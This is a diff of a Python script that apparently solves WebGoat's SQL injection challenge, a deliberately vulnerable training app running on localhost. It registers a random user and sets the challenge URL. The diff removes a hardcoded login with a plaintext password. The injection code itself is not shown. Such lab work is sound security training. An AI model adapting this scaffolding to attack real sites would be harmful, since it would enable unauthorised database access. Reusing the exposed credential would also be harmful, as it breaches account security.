@@ -1,16 +1,25 @@
 #!/usr/local/bin/python3
+# danicrg
+
+# Must be executed while the local server is running!!
 
 import requests
 from string import *
 import re
+from random import *
 
+s = requests.Session()
+
+# Registers a random user
 characters = ascii_lowercase + ascii_uppercase + digits
 
-url = 'http://localhost:8080/WebGoat/login'
-s = requests.Session()
-username = 'danicrg'
-password = 'd.cG4llo'
-s.post(url, params={'username': username, 'password': password})
+username = ''.join(choice(characters) for i in range(12))
+password = '123456'
+
+url = 'http://localhost:8080/WebGoat/register.mvc'
+s.post(url, params={'username': username, 'password': password, 'matchingPassword': password, 'agree': 'agree'})
+
+# Interesting part
 
 url = 'http://localhost:8080/WebGoat/SqlInjection/challenge'
 
